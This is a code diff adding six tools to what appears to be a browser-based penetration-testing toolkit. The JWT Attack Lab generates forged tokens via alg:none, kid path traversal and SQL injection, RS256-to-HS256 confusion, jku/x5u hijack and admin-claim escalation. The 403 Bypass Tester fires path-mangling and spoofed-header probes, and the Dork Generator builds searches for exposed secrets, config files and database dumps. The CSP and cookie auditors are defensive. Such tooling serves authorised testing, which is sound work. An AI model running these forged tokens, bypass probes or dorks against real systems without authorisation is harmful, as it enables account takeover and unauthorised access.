@@ -613,6 +613,13 @@ const UNIVERSAL_TOOLS = [
   { id:"wp-scan",        name:"WordPress Scanner", icon:"📰", cat:"Recon", desc:"Detect WordPress, enumerate users via the REST API, read the version and list plugins/themes.", feat:["user enum","version","plugins"] },
   { id:"webrtc-leak",    name:"WebRTC IP Leak",    icon:"📶", cat:"Recon", desc:"Discover local/public IP addresses leaked by the browser via WebRTC ICE candidates.", feat:["local IP","STUN","mDNS"] },
   { id:"exif-viewer",    name:"EXIF / Metadata",   icon:"📷", cat:"Recon", desc:"Read EXIF metadata (camera, timestamps, GPS) from a JPEG you pick — fully offline.", feat:["GPS","camera","offline"] },
+  // --- wave 4 ---
+  { id:"jwt-attacks",    name:"JWT Attack Lab",    icon:"🎟️", cat:"Offense", desc:"Generate JWT attack tokens: alg:none, kid path/SQLi injection, RS256→HS256 algorithm confusion and jku/x5u hijack.", feat:["alg confusion","kid inject","jku"] },
+  { id:"http-methods",   name:"HTTP Methods Tester", icon:"🔁", cat:"Offense", desc:"Probe which HTTP verbs an endpoint accepts (PUT/DELETE/PATCH/OPTIONS) to find dangerous or misconfigured methods.", feat:["verb tampering","OPTIONS","PUT/DELETE"] },
+  { id:"bypass-403",     name:"403 Bypass Tester", icon:"🚧", cat:"Offense", desc:"Attempt access-control bypass on a forbidden path via path tricks and header overrides (X-Original-URL, X-Forwarded-For…).", feat:["path tricks","header override","X-Original-URL"] },
+  { id:"csp-auditor",    name:"CSP Auditor",       icon:"🧱", cat:"Web", desc:"Fetch or paste a Content-Security-Policy and grade it — unsafe-inline/eval, wildcards, missing directives.", feat:["unsafe-inline","wildcards","grade"] },
+  { id:"cookie-analyzer", name:"Cookie Analyzer",  icon:"🍪", cat:"Web", desc:"Audit Set-Cookie headers for Secure, HttpOnly, SameSite, scope and __Host-/__Secure- prefix compliance.", feat:["Secure/HttpOnly","SameSite","prefixes"] },
+  { id:"dork-generator", name:"Dork Generator",    icon:"🔍", cat:"Recon", desc:"Build Google dork queries for a target — exposed files, login pages, directory listings and secrets.", feat:["filetype","inurl","index of"] },
 ];
 
 // Desktop-only factory — invoked ONLY when Platform.mode === "desktop".
@@ -3029,6 +3036,219 @@ Impl["exif-viewer"] = (root) => {
   root.append(
     UIKit.panel("Image", null, file, el("div", { class: "hint" }, "everything runs locally — the image is never uploaded")),
     UIKit.panel("Metadata", null, o.node, mapLink));
+};
+
+/* ===================== JWT ATTACK LAB ===================== */
+Impl["jwt-attacks"] = (root) => {
+  const tok = UIKit.area("Base JWT", { placeholder: "eyJ...", spellcheck: "false" });
+  const pubkey = UIKit.field("RS256 public key (for alg-confusion, optional)", { placeholder: "-----BEGIN PUBLIC KEY-----…", mono: true });
+  const jku = UIKit.field("Attacker JWKS URL (for jku/x5u, optional)", { placeholder: "https://attacker.test/jwks.json", mono: true });
+  const list = el("div", {});
+  const run = async () => {
+    list.innerHTML = "";
+    const parts = tok.input.value.trim().split(".");
+    if (parts.length < 2) { list.appendChild(el("div", { class: "out err" }, "paste a valid JWT")); return; }
+    let header, payload;
+    try { header = JSON.parse(Bytes.toUtf8(Bytes.fromB64url(parts[0]))); payload = JSON.parse(Bytes.toUtf8(Bytes.fromB64url(parts[1]))); }
+    catch { list.appendChild(el("div", { class: "out err" }, "bad token segments")); return; }
+    const mk = (h, p, sig) => b64urlEnc(h) + "." + b64urlEnc(p) + "." + (sig || "");
+    const hsToken = async (h, p, secret) => mk(h, p, await hmacSign(b64urlEnc(h) + "." + b64urlEnc(p), secret, "SHA-256"));
+    const specs = [];
+    for (const a of ["none", "None", "NONE"]) specs.push({ name: "alg:" + a, note: "signature stripped — works if the lib trusts alg", fn: () => mk({ ...header, alg: a }, payload) });
+    specs.push({ name: "kid → /dev/null (empty key)", note: "kid points at an empty file so the HMAC key is '' (sign with an empty key in your own tooling — Web Crypto forbids it)", fn: () => mk({ ...header, alg: "HS256", kid: "../../../../../../../../dev/null" }, payload) });
+    specs.push({ name: "kid SQLi", note: "kid injects SQL returning the key 'fs'; signed with 'fs'", fn: () => hsToken({ ...header, alg: "HS256", kid: "x' UNION SELECT 'fs'-- -" }, payload, "fs") });
+    if (pubkey.input.value.trim()) specs.push({ name: "RS256 → HS256 confusion", note: "HMAC-signs using the RSA public key as the secret", fn: () => hsToken({ ...header, alg: "HS256" }, payload, pubkey.input.value.trim()) });
+    if (jku.input.value.trim()) {
+      specs.push({ name: "jku hijack (unsigned header)", note: "host a JWKS at this URL with your own key; resign there", fn: () => mk({ ...header, jku: jku.input.value.trim() }, payload) });
+      specs.push({ name: "x5u hijack (unsigned header)", note: "same idea via x5u cert URL", fn: () => mk({ ...header, x5u: jku.input.value.trim() }, payload) });
+    }
+    if (payload.role !== undefined || payload.admin !== undefined || payload.isAdmin !== undefined)
+      specs.push({ name: "claims → admin (alg:none)", note: "privilege escalation in claims", fn: () => mk({ ...header, alg: "none" }, { ...payload, role: "admin", admin: true, isAdmin: true }) });
+    const attacks = [];
+    for (const s of specs) { try { attacks.push({ name: s.name, note: s.note, token: await s.fn() }); } catch (e) { attacks.push({ name: s.name, note: s.note + " — (couldn't sign here: " + e.message + ")", token: mk({ ...header, alg: "HS256", kid: "../../../../dev/null" }, payload) + " [unsigned]" }); } }
+    attacks.forEach(a => list.appendChild(el("div", { class: "list-row" },
+      el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, a.name), el("code", { class: "lr-sub", style: "white-space:pre-wrap;word-break:break-all" }, a.token), el("div", { class: "hint" }, a.note)),
+      UIKit.copyBtn(a.token))));
+    History.add("JWT Attacks", attacks.length + " token(s) generated");
+  };
+  root.append(
+    UIKit.panel("Input", null, tok.wrap, pubkey.wrap, jku.wrap, el("div", { class: "row" }, UIKit.btn("Generate attack tokens", run, "primary"))),
+    UIKit.panel("Attack tokens", null, list));
+};
+
+/* ===================== HTTP METHODS TESTER ===================== */
+Impl["http-methods"] = (root) => {
+  const url = UIKit.field("Target URL", { placeholder: "https://api.your-site.com/resource/1", value: "https://", mono: true });
+  const o = UIKit.out();
+  const METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
+  const run = async () => {
+    o.clear();
+    const u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a URL", "err");
+    o.line("probing methods (TRACE/CONNECT are blocked by the browser)…", "dim"); o.line("");
+    for (const m of METHODS) {
+      try {
+        const r = await HttpKit.send({ method: m, url: u, body: (m === "PUT" || m === "POST" || m === "PATCH") ? "fs=1" : "" });
+        const dangerous = /^(PUT|DELETE|PATCH)$/.test(m) && r.status < 400;
+        o.line(m.padEnd(8) + " " + r.status + (dangerous ? "  ⚠ method enabled — verify it's intended" : r.status === 405 ? "  (not allowed)" : ""), dangerous ? "err" : r.status < 400 ? "ok" : "dim");
+        if (m === "OPTIONS") { const allow = r.headers["allow"] || r.headers["access-control-allow-methods"]; if (allow) o.line("   Allow: " + allow, "v"); }
+      } catch (e) { o.line(m.padEnd(8) + " error: " + e.message, "dim"); }
+    }
+    History.add("HTTP Methods", u);
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Test methods", run, "primary"))),
+    UIKit.panel("Report", null, o.node));
+};
+
+/* ===================== 403 BYPASS TESTER ===================== */
+Impl["bypass-403"] = (root) => {
+  const url = UIKit.field("Forbidden URL", { placeholder: "https://site.com/admin", value: "https://", mono: true });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "technique"), el("th", {}, "status"), el("th", {}, "result"))), tbody);
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    let u; try { u = new URL(url.input.value.trim()); } catch { return o.line("enter a valid URL", "err"); }
+    const origin = u.origin, path = u.pathname;
+    let base; try { base = await HttpKit.send({ method: "GET", url: u.href }); } catch (e) { return o.line("baseline failed: " + e.message, "err"); }
+    o.line("baseline " + path + " → " + base.status, base.status === 403 || base.status === 401 ? "warn" : "dim");
+    const pathV = [path + "/", path + "/.", path + "//", path + "/%2e/", path + "/..;/", path + "%20", path + "%09", path + "?", path + "/~", path + ";/", path.toUpperCase(), "/%2e" + path, path + "..;/", path + ".json"];
+    const hdrV = [{ "X-Original-URL": path }, { "X-Rewrite-URL": path }, { "X-Forwarded-For": "127.0.0.1" }, { "X-Forwarded-Host": "localhost" }, { "X-Custom-IP-Authorization": "127.0.0.1" }, { "X-Originating-IP": "127.0.0.1" }, { "Referer": origin + path }, { "X-Forwarded-Scheme": "http" }];
+    const probes = [
+      ...pathV.map(p => ({ label: "path: " + p, url: origin + p, headers: "" })),
+      ...hdrV.map(h => ({ label: "header: " + Object.keys(h)[0], url: u.href, headers: Object.entries(h).map(([k, v]) => k + ": " + v).join("\n") })),
+    ];
+    let win = 0;
+    const pool = makePool();
+    await pool.run(probes, 6, async (pr) => {
+      try {
+        const r = await HttpKit.send({ method: "GET", url: pr.url, headers: pr.headers });
+        const bypass = r.status < 400 && (base.status === 403 || base.status === 401);
+        if (bypass) win++;
+        tbody.appendChild(el("tr", {}, el("td", {}, pr.label), el("td", { class: bypass ? "ok" : "dim" }, String(r.status)), el("td", { class: bypass ? "sev-high" : "muted" }, bypass ? "⚠ BYPASS (" + r.status + ")" : "")));
+      } catch {}
+    });
+    o.line(""); o.line(win ? "⚠ " + win + " possible bypass(es) — verify the body is real content, not an error page" : "no bypass found", win ? "err" : "ok");
+    History.add("403 Bypass", u.href + " · " + win + " hit(s)");
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Try bypasses", run, "primary"), el("span", { class: "hint" }, "some override headers are dropped by the browser — use a proxy for full coverage"))),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Techniques", null, el("div", { style: "max-height:320px;overflow:auto" }, tbl)));
+};
+
+/* ===================== CSP AUDITOR ===================== */
+function auditCSP(csp) {
+  const out = []; let score = 0, max = 0;
+  const dirs = {}; csp.split(";").forEach(d => { const p = d.trim().split(/\s+/); if (p[0]) dirs[p[0].toLowerCase()] = p.slice(1); });
+  const has = (d) => dirs[d];
+  const chk = (cond, w, good, bad) => { max += w; if (cond) { score += w; out.push(["ok", good]); } else out.push(["warn", bad]); };
+  chk(has("default-src") || has("script-src"), 2, "✓ default-src/script-src defined", "✗ no default-src or script-src");
+  const sd = (dirs["script-src"] || dirs["default-src"] || []).join(" ");
+  chk(!/'unsafe-inline'/.test(sd), 2, "✓ no 'unsafe-inline' in scripts", "✗ 'unsafe-inline' in script-src — XSS not mitigated");
+  chk(!/'unsafe-eval'/.test(sd), 1, "✓ no 'unsafe-eval'", "✗ 'unsafe-eval' present");
+  chk(!/\*/.test(sd) || /'strict-dynamic'/.test(sd), 1, "✓ no wildcard script source", "✗ wildcard (*) script source");
+  chk(/https?:/.test(sd) ? !/(^|\s)https?:(\s|$)/.test(sd) : true, 1, "✓ no bare http(s): scheme source", "⚠ broad scheme source (http:/https:)");
+  chk((dirs["object-src"] || []).join(" ") === "'none'", 1, "✓ object-src 'none'", "✗ object-src not 'none' (plugin/XSS vector)");
+  chk(has("base-uri"), 1, "✓ base-uri set", "✗ no base-uri (base-tag injection)");
+  chk(has("frame-ancestors"), 1, "✓ frame-ancestors set (clickjacking)", "✗ no frame-ancestors");
+  if (/'nonce-|'strict-dynamic'/.test(sd)) out.push(["ok", "✓ uses nonce/strict-dynamic (modern)"]);
+  return { out, score, max };
+}
+Impl["csp-auditor"] = (root) => {
+  const url = UIKit.field("Fetch CSP from URL", { placeholder: "https://your-site.com", mono: true });
+  const paste = UIKit.area("…or paste a CSP", { placeholder: "default-src 'self'; script-src 'self' 'unsafe-inline'" });
+  const o = UIKit.out();
+  const gradeBox = el("div", {});
+  const render = (csp) => {
+    o.clear(); gradeBox.innerHTML = "";
+    if (!csp.trim()) return o.line("no CSP to audit — a missing CSP is itself a finding", "warn");
+    o.line(csp, "dim"); o.line("");
+    const { out, score, max } = auditCSP(csp);
+    out.forEach(([c, t]) => o.line(t, c === "ok" ? "ok" : "warn"));
+    const pct = score / max, letter = pct >= .9 ? "A" : pct >= .7 ? "B" : pct >= .5 ? "C" : pct >= .3 ? "D" : "F";
+    gradeBox.appendChild(el("div", { class: "row" }, el("div", { class: "grade " + letter }, letter), el("div", { class: "muted" }, score + "/" + max + " checks")));
+  };
+  const fetchIt = async () => {
+    o.clear();
+    if (!/^https?:\/\//.test(url.input.value.trim())) return o.line("enter a URL or paste a CSP below", "err");
+    try { const r = await Net.fetchURL(url.input.value.trim()); const csp = r.headers.get("content-security-policy"); if (!csp) return o.line("✗ no Content-Security-Policy header (or hidden by CORS — paste it instead)", "warn"); render(csp); History.add("CSP Auditor", url.input.value.trim()); }
+    catch (e) { o.line("fetch failed: " + e.message, "err"); }
+  };
+  root.append(
+    UIKit.panel("Source", null, el("div", { class: "row" }, url.wrap, UIKit.btn("Fetch & audit", fetchIt, "primary")), paste.wrap, el("div", { class: "row" }, UIKit.btn("Audit pasted CSP", () => render(paste.input.value)))),
+    UIKit.panel("Grade", null, gradeBox),
+    UIKit.panel("Findings", null, o.node));
+};
+
+/* ===================== COOKIE ANALYZER ===================== */
+Impl["cookie-analyzer"] = (root) => {
+  const paste = UIKit.area("Set-Cookie headers (one per line)", { placeholder: "session=abc; Path=/; HttpOnly; Secure; SameSite=Lax\ntoken=xyz; Path=/" });
+  const o = UIKit.out();
+  const run = () => {
+    o.clear();
+    const lines = paste.input.value.split("\n").map(s => s.trim()).filter(Boolean);
+    if (!lines.length) return o.line("paste one or more Set-Cookie headers", "err");
+    lines.forEach(line => {
+      const parts = line.split(";").map(s => s.trim());
+      const [name] = parts[0].split("=");
+      const attrs = {}; parts.slice(1).forEach(a => { const [k, v] = a.split("="); attrs[k.toLowerCase()] = v === undefined ? true : v; });
+      o.line("🍪 " + name, "k");
+      const flag = (cond, good, bad, sev) => o.line("   " + (cond ? "✓ " + good : "✗ " + bad), cond ? "ok" : sev || "warn");
+      flag(attrs.secure, "Secure", "not Secure — sent over HTTP");
+      flag(attrs.httponly, "HttpOnly", "not HttpOnly — readable by JS (XSS can steal it)", "err");
+      const ss = (attrs.samesite || "").toLowerCase();
+      flag(ss === "strict" || ss === "lax", "SameSite=" + (attrs.samesite || ""), "SameSite missing/None — CSRF exposure");
+      if (/^__Host-/.test(name)) flag(attrs.secure && attrs.path === "/" && !attrs.domain, "__Host- prefix valid", "__Host- prefix INVALID (needs Secure, Path=/, no Domain)", "err");
+      if (/^__Secure-/.test(name)) flag(attrs.secure, "__Secure- prefix valid", "__Secure- prefix needs Secure", "err");
+      if (!attrs["max-age"] && !attrs.expires) o.line("   ℹ session cookie (no Expires/Max-Age)", "dim");
+      o.line("");
+    });
+    History.add("Cookie Analyzer", lines.length + " cookie(s)");
+  };
+  root.append(
+    UIKit.panel("Cookies", null, paste.wrap, el("div", { class: "row" }, UIKit.btn("Analyze", run, "primary"))),
+    UIKit.panel("Audit", null, o.node));
+};
+
+/* ===================== DORK GENERATOR ===================== */
+Impl["dork-generator"] = (root) => {
+  const dom = UIKit.field("Domain", { placeholder: "example.com", mono: true });
+  const kw = UIKit.field("Keyword (optional)", { placeholder: "password" });
+  const list = el("div", {});
+  const DORKS = [
+    ["Indexed pages", d => `site:${d}`],
+    ["Subdomains", d => `site:*.${d} -www`],
+    ["Login pages", d => `site:${d} (inurl:login OR inurl:admin OR inurl:signin)`],
+    ["Exposed documents", d => `site:${d} (filetype:pdf OR filetype:xlsx OR filetype:docx)`],
+    ["Config / env files", d => `site:${d} (ext:env OR ext:ini OR ext:conf OR ext:cfg OR ext:yml)`],
+    ["Database / SQL dumps", d => `site:${d} (ext:sql OR ext:db OR ext:bak)`],
+    ["Log files", d => `site:${d} ext:log`],
+    ["Directory listing", d => `site:${d} intitle:"index of"`],
+    ["Backup / old files", d => `site:${d} (inurl:backup OR inurl:old OR ext:bak OR ext:old)`],
+    ["API / swagger", d => `site:${d} (inurl:api OR inurl:swagger OR inurl:graphql)`],
+    ["Git / source exposure", d => `site:${d} (inurl:.git OR inurl:.svn OR ext:gitignore)`],
+    ["Secrets / keys", d => `site:${d} (intext:"api_key" OR intext:"secret" OR intext:"BEGIN RSA")`],
+    ["Open redirects", d => `site:${d} (inurl:redirect OR inurl:url= OR inurl:next=)`],
+    ["Error messages", d => `site:${d} (intext:"sql syntax" OR intext:"stack trace" OR intext:"fatal error")`],
+  ];
+  const render = () => {
+    list.innerHTML = "";
+    const d = dom.input.value.trim() || "example.com"; const k = kw.input.value.trim();
+    DORKS.forEach(([name, fn]) => {
+      let q = fn(d); if (k) q += ` "${k}"`;
+      const href = "https://www.google.com/search?q=" + encodeURIComponent(q);
+      list.appendChild(el("div", { class: "list-row" },
+        el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, name), el("code", { class: "lr-sub", style: "white-space:pre-wrap;word-break:break-all" }, q)),
+        el("a", { href, target: "_blank", class: "btn ghost" }, "search ↗"), UIKit.copyBtn(q)));
+    });
+  };
+  [dom, kw].forEach(f => f.input.addEventListener("input", render));
+  render();
+  root.append(
+    UIKit.panel("Target", null, el("div", { class: "toolbar" }, dom.wrap, kw.wrap)),
+    UIKit.panel("Dorks", null, list));
 };
 
 /* ===================== HISTORY (shared) ===================== */
